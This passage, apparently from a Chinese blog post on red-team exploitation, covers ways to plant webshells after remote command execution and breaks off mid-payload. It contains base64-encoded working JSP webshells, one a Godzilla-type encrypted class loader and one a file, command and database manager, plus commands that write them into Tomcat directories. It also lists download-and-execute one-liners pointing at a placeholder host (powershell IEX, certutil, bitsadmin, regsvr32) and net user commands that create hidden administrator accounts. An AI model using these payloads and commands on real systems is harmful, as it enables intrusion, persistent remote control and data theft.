[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String(‘PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgdmVyc2lvbj0iMS4yIj48anNwOmRlY2xhcmF0aW9uPiBTdHJpbmcgeGM9IjNjNmUwYjhhOWMxNTIyNGEiOyBTdHJpbmcgcGFzcz0icGFzcyI7IFN0cmluZyBtZDU9bWQ1KHBhc3MreGMpOyBjbGFzcyBYIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7cHVibGljIFgoQ2xhc3NMb2FkZXIgeil7c3VwZXIoeik7fXB1YmxpYyBDbGFzcyBRKGJ5dGVbXSBjYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGNiLCAwLCBjYi5sZW5ndGgpO30gfXB1YmxpYyBieXRlW10geChieXRlW10gcyxib29sZWFuIG0peyB0cnl7amF2YXguY3J5cHRvLkNpcGhlciBjPWphdmF4LmNyeXB0by5DaXBoZXIuZ2V0SW5zdGFuY2UoIkFFUyIpO2MuaW5pdChtPzE6MixuZXcgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyh4Yy5nZXRCeXRlcygpLCJBRVMiKSk7cmV0dXJuIGMuZG9GaW5hbChzKTsgfWNhdGNoIChFeGNlcHRpb24gZSl7cmV0dXJuIG51bGw7IH19IHB1YmxpYyBzdGF0aWMgU3RyaW5nIG1kNShTdHJpbmcgcykge1N0cmluZyByZXQgPSBudWxsO3RyeSB7amF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0IG07bSA9IGphdmEuc2VjdXJpdHkuTWVzc2FnZURpZ2VzdC5nZXRJbnN0YW5jZSgiTUQ1Iik7bS51cGRhdGUocy5nZXRCeXRlcygpLCAwLCBzLmxlbmd0aCgpKTtyZXQgPSBuZXcgamF2YS5tYXRoLkJpZ0ludGVnZXIoMSwgbS5kaWdlc3QoKSkudG9TdHJpbmcoMTYpLnRvVXBwZXJDYXNlKCk7fSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt9cmV0dXJuIHJldDsgfSBwdWJsaWMgc3RhdGljIFN0cmluZyBiYXNlNjRFbmNvZGUoYnl0ZVtdIGJzKSB0aHJvd3MgRXhjZXB0aW9uIHtDbGFzcyBiYXNlNjQ7U3RyaW5nIHZhbHVlID0gbnVsbDt0cnkge2Jhc2U2ND1DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7T2JqZWN0IEVuY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXRFbmNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7dmFsdWUgPSAoU3RyaW5nKUVuY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImVuY29kZVRvU3RyaW5nIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NEVuY29kZXIiKTsgT2JqZWN0IEVuY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoU3RyaW5nKUVuY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImVuY29kZSIsIG5ldyBDbGFzc1tdIHsgYnl0ZVtdLmNsYXNzIH0pLmludm9rZShFbmNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZTIpIHt9fXJldHVybiB2YWx1ZTsgfSBwdWJsaWMgc3RhdGljIGJ5dGVbXSBiYXNlNjREZWNvZGUoU3RyaW5nIGJzKSB0aHJvd3MgRXhjZXB0aW9uIHtDbGFzcyBiYXNlNjQ7Ynl0ZVtdIHZhbHVlID0gbnVsbDt0cnkge2Jhc2U2ND1DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7T2JqZWN0IGRlY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXREZWNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7dmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIG5ldyBDbGFzc1tdIHsgU3RyaW5nLmNsYXNzIH0pLmludm9rZShkZWNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZSkge3RyeSB7IGJhc2U2ND1DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIik7IE9iamVjdCBkZWNvZGVyID0gYmFzZTY0Lm5ld0luc3RhbmNlKCk7IHZhbHVlID0gKGJ5dGVbXSlkZWNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBuZXcgQ2xhc3NbXSB7IFN0cmluZy5jbGFzcyB9KS5pbnZva2UoZGVjb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUyKSB7fX1yZXR1cm4gdmFsdWU7IH08L2pzcDpkZWNsYXJhdGlvbj48anNwOnNjcmlwdGxldD50cnl7Ynl0ZVtdIGRhdGE9YmFzZTY0RGVjb2RlKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKHBhc3MpKTtkYXRhPXgoZGF0YSwgZmFsc2UpO2lmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpPT1udWxsKXtzZXNzaW9uLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsbmV3IFgodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLlEoZGF0YSkpO31lbHNle3JlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIixkYXRhKTtqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBhcnJPdXQ9bmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7T2JqZWN0IGY9KChDbGFzcylzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpO2YuZXF1YWxzKGFyck91dCk7Zi5lcXVhbHMocGFnZUNvbnRleHQpO3Jlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMCwxNikpO2YudG9TdHJpbmcoKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNvZGUoeChhcnJPdXQudG9CeXRlQXJyYXkoKSwgdHJ1ZSkpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDE2KSk7fSB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9PC9qc3A6c2NyaXB0bGV0PjwvanNwOnJvb3Q+’)) &gt;./webapps/nc_web/123111.jspx</p>
+<p><img src="RCE写shell姿势总结.assets/image-20211110234036047.png" alt="image-20211110234036047"></p>
+<p>哥斯拉的马</p>
+<p><img src="RCE写shell姿势总结.assets/image-20211110234050159.png" alt="image-20211110234050159"></p>
+<p>在红蓝对抗中，远程命令执行类漏洞往往是攻击方在正面路径中突破边界非常青睐的。常见的可以执行远程命令的漏洞的有各种 JAVA 反序列化漏洞、远程代码执行漏洞、远程命令执行漏洞（原生）、表达式执行漏洞、SQL 注入漏洞等。远程命令执行类漏洞从漏洞探测到漏洞利用其实都非常讲究技巧。如果在进行漏洞探测阶段考虑的情况不全就会很容易遗漏漏洞，与漏洞擦肩而过；在漏洞利用阶段如果知识面不广（姿势不够多）的话可能就会陷入苦苦挣扎却无法获取权限的困境。</p>
+<p>从大方向上看，远程命令执行类漏洞在漏洞利用阶段关注的问题主要是三个：目标操作系统类型、执行命令结果是否有回显以及是否能通外网。针对不同的操作系统，执行命令各有差异。另外，目标是否有回显是漏洞利用的难易程度的关键因素之一，一般来说，可以回显的漏洞要比无回显的漏洞利用要容易得多 (当然也可以通过其他方法让原本无回显的漏洞得到回显，这里先不讨论这种情况)。最后目标是否能通外网也是直接影响漏洞利用的关键因素，如果漏洞无回显并且也不通外网，那漏洞利用可的难度就大大增加了。从更加细节的角度去考虑，针对不同的漏洞，不同的环境，需要考虑的额外因素就更多了。比如操作系统是否存在或者可以执行某个命令、目标是否安装杀软、命令中的特殊符号等问题。以下就远程命令执行漏洞的利用技巧做一个简单的总结。</p>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h3><p>是否有回显：是<br>是否通外网：是</p>
+<p>解决思路：<br>有回显也可以通外网的场景是最简单，获取权限的方法也是多样的，以下主要简单总结一些常见的方法或思路</p>
+<p>方法一：确认 Web 应用物理路径，然后写入 webshell (参考场景二)</p>
+<p>方法二：远程下载并执行<br>a）powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://x.x.x.x/p&apos;))&quot;</span><br></pre></td></tr></table></figure>
+<p>b)certutil</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://x.x.x.x/test.exe C:\\Windows\\Temp\\test.exe&amp;&amp;C:\\Windows\\Temp\\test.exe</span><br></pre></td></tr></table></figure>
+<p>c)bitsadmin</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://x.x.x.x/test.exe C:\\Windows\\Temp\\test.exe&amp;&amp;C:\\Windows\\Temp\\test.exe</span><br></pre></td></tr></table></figure>
+<p>d)regsvr32</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /n /u /i:http://x.x.x.x/r scrobj.dll</span><br></pre></td></tr></table></figure>
+<p>方法三：如果目标开放远程桌面端口的话，并且权限足够可以直接执行命令添加账号 (内网比较常见)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net user test test@123qaz /add</span><br><span class="line">net localgroup administrators test /add</span><br><span class="line">或者启用guest账号：</span><br><span class="line">net user guest /active:yes</span><br><span class="line">net user guest guest@123qaz</span><br><span class="line">net localgroup administrators guest /add</span><br></pre></td></tr></table></figure>
+<h3 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h3><p>是否有回显：是<br>是否通外网：否</p>
+<p>解决思路：针对这种场景，解决方法就比较灵活了。因为不通外网，所以主思路还是想办法写入 webshell。</p>
+<ol>
+<li>确认 Web 应用物理路径</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir /s/a-d/b /WEB-INF/web.xml</span><br><span class="line">或者</span><br><span class="line">for /r c:\ %i in (checkCode.js*) do @echo %i</span><br></pre></td></tr></table></figure>
+<ol>
+<li>写入 webshell，需要考虑 webshell 特殊符号问题，可以先做 base64 编码写入</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -----BEGIN CERTIFICATE----- &gt;D:\\OA\\apache-tomcat-7.0.91\\webapps\\ROOT\\shell.txt&amp;&amp;echo PCVAcGFnZSBpbXBvcnQ9ImphdmEuaW8uKixqYXZhLnV0aWwuKixqYXZhLm5ldC4qLGphdmEuc3FsLiosamF2YS50ZXh0LioiJT48JSFTdHJpbmcgUHdkPSIxMTAiO1N0cmluZyBjcz0iVVRGLTgiO1N0cmluZyBFQyhTdHJpbmcgcyl0aHJvd3MgRXhjZXB0aW9ue3JldHVybiBuZXcgU3RyaW5nKHMuZ2V0Qnl0ZXMoIklTTy04ODU5LTEiKSxjcyk7fUNvbm5lY3Rpb24gR0MoU3RyaW5nIHMpdGhyb3dzIEV4Y2VwdGlvbntTdHJpbmdbXSB4PXMudHJpbSgpLnNwbGl0KCJcclxuIik7Q2xhc3MuZm9yTmFtZSh4WzBdLnRyaW0oKSk7aWYoeFsxXS5pbmRleE9mKCJqZGJjOm9yYWNsZSIpIT0tMSl7cmV0dXJuIERyaXZlck1hbmFnZXIuZ2V0Q29ubmVjdGlvbih4WzFdLnRyaW0oKSsiOiIreFs0XSx4WzJdLmVxdWFsc0lnbm9yZUNhc2UoIlsvbnVsbF0iKT8iIjp4WzJdLHhbM10uZXF1YWxzSWdub3JlQ2FzZSgiWy9udWxsXSIpPyIiOnhbM10pO31lbHNle0Nvbm5lY3Rpb24gYz1Ecml2ZXJNYW5hZ2VyLmdldENvbm5lY3Rpb24oeFsxXS50cmltKCkseFsyXS5lcXVhbHNJZ25vcmVDYXNlKCJbL251bGxdIik/IiI6eFsyXSx4WzNdLmVxdWFsc0lnbm9yZUNhc2UoIlsvbnVsbF0iKT8iIjp4WzNdKTtpZih4Lmxlbmd0aD40KXtjLnNldENhdGFsb2coeFs0XSk7fXJldHVybiBjO319dm9pZCBBQShTdHJpbmdCdWZmZXIgc2IpdGhyb3dzIEV4Y2VwdGlvbntGaWxlIHJbXT1GaWxlLmxpc3RSb290cygpO2ZvcihpbnQgaT0wO2k8ci5sZW5ndGg7aSsrKXtzYi5hcHBlbmQocltpXS50b1N0cmluZygpLnN1YnN0cmluZygwLDIpKTt9fXZvaWQgQkIoU3RyaW5nIHMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257RmlsZSBvRj1uZXcgRmlsZShzKSxsW109b0YubGlzdEZpbGVzKCk7U3RyaW5nIHNULHNRLHNGPSIiO2phdmEudXRpbC5EYXRlIGR0O1NpbXBsZURhdGVGb3JtYXQgZm09bmV3IFNpbXBsZURhdGVGb3JtYXQoInl5eXktTU0tZGQgSEg6bW06c3MiKTtmb3IoaW50IGk9MDsgaTxsLmxlbmd0aDsgaSsrKXtkdD1uZXcgamF2YS51dGlsLkRhdGUobFtpXS5sYXN0TW9kaWZpZWQoKSk7c1Q9Zm0uZm9ybWF0KGR0KTtzUT1sW2ldLmNhblJlYWQoKT8iUiI6IiI7c1EgKz1sW2ldLmNhbldyaXRlKCk/IiBXIjoiIjtpZihsW2ldLmlzRGlyZWN0b3J5KCkpe3NiLmFwcGVuZChsW2ldLmdldE5hbWUoKSsiL1x0IitzVCsiXHQiK2xbaV0ubGVuZ3RoKCkrIlx0IitzUSsiXG4iKTt9ZWxzZXtzRis9bFtpXS5nZXROYW1lKCkrIlx0IitzVCsiXHQiK2xbaV0ubGVuZ3RoKCkrIlx0IitzUSsiXG4iO319c2IuYXBwZW5kKHNGKTt9dm9pZCBFRShTdHJpbmcgcyl0aHJvd3MgRXhjZXB0aW9ue0ZpbGUgZj1uZXcgRmlsZShzKTtpZihmLmlzRGlyZWN0b3J5KCkpe0ZpbGUgeFtdPWYubGlzdEZpbGVzKCk7Zm9yKGludCBrPTA7IGsgPCB4Lmxlbmd0aDsgaysrKXtpZigheFtrXS5kZWxldGUoKSl7RUUoeFtrXS5nZXRQYXRoKCkpO319fWYuZGVsZXRlKCk7fXZvaWQgRkYoU3RyaW5nIHMsSHR0cFNlcnZsZXRSZXNwb25zZSByKXRocm93cyBFeGNlcHRpb257aW50IG47Ynl0ZVtdIGI9bmV3IGJ5dGVbNTEyXTtyLnJlc2V0KCk7U2VydmxldE91dHB1dFN0cmVhbSBvcz1yLmdldE91dHB1dFN0cmVhbSgpO0J1ZmZlcmVkSW5wdXRTdHJlYW0gaXM9bmV3IEJ1ZmZlcmVkSW5wdXRTdHJlYW0obmV3IEZpbGVJbnB1dFN0cmVhbShzKSk7b3Mud3JpdGUoKCItPiIrInwiKS5nZXRCeXRlcygpLDAsMyk7d2hpbGUoKG49aXMucmVhZChiLDAsNTEyKSkhPS0xKXtvcy53cml0ZShiLDAsbik7fW9zLndyaXRlKCgifCIrIjwtIikuZ2V0Qnl0ZXMoKSwwLDMpO29zLmNsb3NlKCk7aXMuY2xvc2UoKTt9dm9pZCBHRyhTdHJpbmcgcyxTdHJpbmcgZCl0aHJvd3MgRXhjZXB0aW9ue1N0cmluZyBoPSIwMTIzNDU2Nzg5QUJDREVGIjtGaWxlIGY9bmV3IEZpbGUocyk7Zi5jcmVhdGVOZXdGaWxlKCk7RmlsZU91dHB1dFN0cmVhbSBvcz1uZXcgRmlsZU91dHB1dFN0cmVhbShmKTtmb3IoaW50IGk9MDsgaTxkLmxlbmd0aCgpO2krPTIpe29zLndyaXRlKChoLmluZGV4T2YoZC5jaGFyQXQoaSkpIDw8IDQgfCBoLmluZGV4T2YoZC5jaGFyQXQoaSsxKSkpKTt9b3MuY2xvc2UoKTt9dm9pZCBISChTdHJpbmcgcyxTdHJpbmcgZCl0aHJvd3MgRXhjZXB0aW9ue0ZpbGUgc2Y9bmV3IEZpbGUocyksZGY9bmV3IEZpbGUoZCk7aWYoc2YuaXNEaXJlY3RvcnkoKSl7aWYoIWRmLmV4aXN0cygpKXtkZi5ta2RpcigpO31GaWxlIHpbXT1zZi5saXN0RmlsZXMoKTtmb3IoaW50IGo9MDsgajx6Lmxlbmd0aDsgaisrKXtISChzKyIvIit6W2pdLmdldE5hbWUoKSxkKyIvIit6W2pdLmdldE5hbWUoKSk7fX1lbHNle0ZpbGVJbnB1dFN0cmVhbSBpcz1uZXcgRmlsZUlucHV0U3RyZWFtKHNmKTtGaWxlT3V0cHV0U3RyZWFtIG9zPW5ldyBGaWxlT3V0cHV0U3RyZWFtKGRmKTtpbnQgbjtieXRlW10gYj1uZXcgYnl0ZVs1MTJdO3doaWxlKChuPWlzLnJlYWQoYiwwLDUxMikpIT0tMSl7b3Mud3JpdGUoYiwwLG4pO31pcy5jbG9zZSgpO29zLmNsb3NlKCk7fX12b2lkIElJKFN0cmluZyBzLFN0cmluZyBkKXRocm93cyBFeGNlcHRpb257RmlsZSBzZj1uZXcgRmlsZShzKSxkZj1uZXcgRmlsZShkKTtzZi5yZW5hbWVUbyhkZik7fXZvaWQgSkooU3RyaW5nIHMpdGhyb3dzIEV4Y2VwdGlvbntGaWxlIGY9bmV3IEZpbGUocyk7Zi5ta2RpcigpO312b2lkIEtLKFN0cmluZyBzLFN0cmluZyB0KXRocm93cyBFeGNlcHRpb257RmlsZSBmPW5ldyBGaWxlKHMpO1NpbXBsZURhdGVGb3JtYXQgZm09bmV3IFNpbXBsZURhdGVGb3JtYXQoInl5eXktTU0tZGQgSEg6bW06c3MiKTtqYXZhLnV0aWwuRGF0ZSBkdD1mbS5wYXJzZSh0KTtmLnNldExhc3RNb2RpZmllZChkdC5nZXRUaW1lKCkpO312b2lkIExMKFN0cmluZyBzLFN0cmluZyBkKXRocm93cyBFeGNlcHRpb257VVJMIHU9bmV3IFVSTChzKTtpbnQgbj0wO0ZpbGVPdXRwdXRTdHJlYW0gb3M9bmV3IEZpbGVPdXRwdXRTdHJlYW0oZCk7SHR0cFVSTENvbm5lY3Rpb24gaD0oSHR0cFVSTENvbm5lY3Rpb24pIHUub3BlbkNvbm5lY3Rpb24oKTtJbnB1dFN0cmVhbSBpcz1oLmdldElucHV0U3RyZWFtKCk7Ynl0ZVtdIGI9bmV3IGJ5dGVbNTEyXTt3aGlsZSgobj1pcy5yZWFkKGIpKSE9LTEpe29zLndyaXRlKGIsMCxuKTt9b3MuY2xvc2UoKTtpcy5jbG9zZSgpO2guZGlzY29ubmVjdCgpO312b2lkIE1NKElucHV0U3RyZWFtIGlzLFN0cmluZ0J1ZmZlciBzYil0aHJvd3MgRXhjZXB0aW9ue1N0cmluZyBsO0J1ZmZlcmVkUmVhZGVyIGJyPW5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIoaXMpKTt3aGlsZSgobD1ici5yZWFkTGluZSgpKSE9bnVsbCl7c2IuYXBwZW5kKGwrIlxyXG4iKTt9fXZvaWQgTk4oU3RyaW5nIHMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257Q29ubmVjdGlvbiBjPUdDKHMpO1Jlc3VsdFNldCByPXMuaW5kZXhPZigiamRiYzpvcmFjbGUiKSE9LTE/Yy5nZXRNZXRhRGF0YSgpLmdldFNjaGVtYXMoKTpjLmdldE1ldGFEYXRhKCkuZ2V0Q2F0YWxvZ3MoKTt3aGlsZShyLm5leHQoKSl7c2IuYXBwZW5kKHIuZ2V0U3RyaW5nKDEpKyJcdCIpO31yLmNsb3NlKCk7Yy5jbG9zZSgpO312b2lkIE9PKFN0cmluZyBzLFN0cmluZ0J1ZmZlciBzYil0aHJvd3MgRXhjZXB0aW9ue0Nvbm5lY3Rpb24gYz1HQyhzKTtTdHJpbmdbXSB4PXMudHJpbSgpLnNwbGl0KCJcclxuIik7UmVzdWx0U2V0IHI9Yy5nZXRNZXRhRGF0YSgpLmdldFRhYmxlcyhudWxsLHMuaW5kZXhPZigiamRiYzpvcmFjbGUiKSE9LTE/eC5sZW5ndGg+NT94WzVdOnhbNF06bnVsbCwiJSIsbmV3IFN0cmluZ1tdeyJUQUJMRSJ9KTt3aGlsZShyLm5leHQoKSl7c2IuYXBwZW5kKHIuZ2V0U3RyaW5nKCJUQUJMRV9OQU1FIikrIlx0Iik7fXIuY2xvc2UoKTtjLmNsb3NlKCk7fXZvaWQgUFAoU3RyaW5nIHMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257U3RyaW5nW10geD1zLnRyaW0oKS5zcGxpdCgiXHJcbiIpO0Nvbm5lY3Rpb24gYz1HQyhzKTtTdGF0ZW1lbnQgbT1jLmNyZWF0ZVN0YXRlbWVudCgxMDA1LDEwMDcpO1Jlc3VsdFNldCByPW0uZXhlY3V0ZVF1ZXJ5KCJzZWxlY3QgKiBmcm9tICIreFt4Lmxlbmd0aC0xXSk7UmVzdWx0U2V0TWV0YURhdGEgZD1yLmdldE1ldGFEYXRhKCk7Zm9yKGludCBpPTE7aTw9ZC5nZXRDb2x1bW5Db3VudCgpO2krKyl7c2IuYXBwZW5kKGQuZ2V0Q29sdW1uTmFtZShpKSsiICgiK2QuZ2V0Q29sdW1uVHlwZU5hbWUoaSkrIilcdCIpO31yLmNsb3NlKCk7bS5jbG9zZSgpO2MuY2xvc2UoKTt9dm9pZCBRUShTdHJpbmcgY3MsU3RyaW5nIHMsU3RyaW5nIHEsU3RyaW5nQnVmZmVyIHNiLFN0cmluZyBwKXRocm93cyBFeGNlcHRpb257Q29ubmVjdGlvbiBjPUdDKHMpO1N0YXRlbWVudCBtPWMuY3JlYXRlU3RhdGVtZW50KDEwMDUsMTAwOCk7QnVmZmVyZWRXcml0ZXIgYnc9bnVsbDt0cnl7UmVzdWx0U2V0IHI9bS5leGVjdXRlUXVlcnkocS5pbmRleE9mKCItLWY6IikhPS0xP3Euc3Vic3RyaW5nKDAscS5pbmRleE9mKCItLWY6IikpOnEpO1Jlc3VsdFNldE1ldGFEYXRhIGQ9ci5nZXRNZXRhRGF0YSgpO2ludCBuPWQuZ2V0Q29sdW1uQ291bnQoKTtmb3IoaW50IGk9MTsgaSA8PW47IGkrKyl7c2IuYXBwZW5kKGQuZ2V0Q29sdW1uTmFtZShpKSsiXHR8XHQiKTt9c2IuYXBwZW5kKCJcclxuIik7aWYocS5pbmRleE9mKCItLWY6IikhPS0xKXtGaWxlIGZpbGU9bmV3IEZpbGUocCk7aWYocS5pbmRleE9mKCItdG86Iik9PS0xKXtmaWxlLm1rZGlyKCk7fWJ3PW5ldyBCdWZmZXJlZFdyaXRlcihuZXcgT3V0cHV0U3RyZWFtV3JpdGVyKG5ldyBGaWxlT3V0cHV0U3RyZWFtKG5ldyBGaWxlKHEuaW5kZXhPZigiLXRvOiIpIT0tMT9wLnRyaW0oKTpwK3Euc3Vic3RyaW5nKHEuaW5kZXhPZigiLS1mOiIpKzQscS5sZW5ndGgoKSkudHJpbSgpKSx0cnVlKSxjcykpO313aGlsZShyLm5leHQoKSl7Zm9yKGludCBpPTE7IGk8PW47aSsrKXtpZihxLmluZGV4T2YoIi0tZjoiKSE9LTEpe2J3LndyaXRlKHIuZ2V0T2JqZWN0KGkpKyIiKyJcdCIpO2J3LmZsdXNoKCk7fWVsc2V7c2IuYXBwZW5kKHIuZ2V0T2JqZWN0KGkpKyIiKyJcdHxcdCIpO319aWYoYnchPW51bGwpe2J3Lm5ld0xpbmUoKTt9c2IuYXBwZW5kKCJcclxuIik7fXIuY2xvc2UoKTtpZihidyE9bnVsbCl7YncuY2xvc2UoKTt9fWNhdGNoKEV4Y2VwdGlvbiBlKXtzYi5hcHBlbmQoIlJlc3VsdFx0fFx0XHJcbiIpO3RyeXttLmV4ZWN1dGVVcGRhdGUocSk7c2IuYXBwZW5kKCJFeGVjdXRlIFN1Y2Nlc3NmdWxseSFcdHxcdFxyXG4iKTt9Y2F0Y2goRXhjZXB0aW9uIGVlKXtzYi5hcHBlbmQoZWUudG9TdHJpbmcoKSsiXHR8XHRcclxuIik7fX1tLmNsb3NlKCk7Yy5jbG9zZSgpO30lPjwlY3M9cmVxdWVzdC5nZXRQYXJhbWV0ZXIoInowIikhPW51bGw/cmVxdWVzdC5nZXRQYXJhbWV0ZXIoInowIikrIiI6Y3M7cmVzcG9uc2Uuc2V0Q29udGVudFR5cGUoInRleHQvaHRtbCIpO3Jlc3BvbnNlLnNldENoYXJhY3RlckVuY29kaW5nKGNzKTtTdHJpbmdCdWZmZXIgc2I9bmV3IFN0cmluZ0J1ZmZlcigiIik7dHJ5e1N0cmluZyBaPUVDKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKFB3ZCkrIiIpO1N0cmluZyB6MT1FQyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiejEiKSsiIik7U3RyaW5nIHoyPUVDKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJ6MiIpKyIiKTtzYi5hcHBlbmQoIi0+IisifCIpO1N0cmluZyBzPXJlcXVlc3QuZ2V0U2Vzc2lvbigpLmdldFNlcnZsZXRDb250ZXh0KCkuZ2V0UmVhbFBhdGgoIi8iKTtpZihaLmVxdWFscygiQSIpKXtzYi5hcHBlbmQocysiXHQiKTtpZighcy5zdWJzdHJpbmcoMCwxKS5lcXVhbHMoIi8iKSl7QUEoc2IpO319ZWxzZSBpZihaLmVxdWFscygiQiIpKXtCQih6MSxzYik7fWVsc2UgaWYoWi5lcXVhbHMoIkMiKSl7U3RyaW5nIGw9IiI7QnVmZmVyZWRSZWFkZXIgYnI9bmV3IEJ1ZmZlcmVkUmVhZGVyKG5ldyBJbnB1dFN0cmVhbVJlYWRlcihuZXcgRmlsZUlucHV0U3RyZWFtKG5ldyBGaWxlKHoxKSkpKTt3aGlsZSgobD1ici5yZWFkTGluZSgpKSE9bnVsbCl7c2IuYXBwZW5kKGwrIlxyXG4iKTt9YnIuY2xvc2UoKTt9ZWxzZSBpZihaLmVxdWFscygiRCIpKXtCdWZmZXJlZFdyaXRlciBidz1uZXcgQnVmZmVyZWRXcml0ZXIobmV3IE91dHB1dFN0cmVhbVdyaXRlcihuZXcgRmlsZU91dHB1dFN0cmVhbShuZXcgRmlsZSh6MSkpKSk7Yncud3JpdGUoejIpO2J3LmNsb3NlKCk7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIkUiKSl7RUUoejEpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJGIikpe0ZGKHoxLHJlc3BvbnNlKTt9ZWxzZSBpZihaLmVxdWFscygiRyIpKXtHRyh6MSx6Mik7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIkgiKSl7SEgoejEsejIpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJJIikpe0lJKHoxLHoyKTtzYi5hcHBlbmQoIjEiKTt9ZWxzZSBpZihaLmVxdWFscygiSiIpKXtKSih6MSk7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIksiKSl7S0soejEsejIpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJMIikpe0xMKHoxLHoyKTtzYi5hcHBlbmQoIjEiKTt9ZWxzZSBpZihaLmVxdWFscygiTSIpKXtTdHJpbmdbXSBjPXt6MS5zdWJzdHJpbmcoMiksejEuc3Vic3RyaW5nKDAsMiksejJ9O1Byb2Nlc3MgcD1SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO01NKHAuZ2V0SW5wdXRTdHJlYW0oKSxzYik7TU0ocC5nZXRFcnJvclN0cmVhbSgpLHNiKTt9ZWxzZSBpZihaLmVxdWFscygiTiIpKXtOTih6MSxzYik7fWVsc2UgaWYoWi5lcXVhbHMoIk8iKSl7T08oejEsc2IpO31lbHNlIGlmKFouZXF1YWxzKCJQIikpe1BQKHoxLHNiKTt9ZWxzZSBpZihaLmVxdWFscygiUSIpKXtRUShjcyx6MSx6MixzYix6Mi5pbmRleE9mKCItdG86IikhPS0xP3oyLnN1YnN0cmluZyh6Mi5pbmRleE9mKCItdG86IikrNCx6Mi5sZW5ndGgoKSk6cy5yZXBsYWNlQWxsKCJcXFxcIiw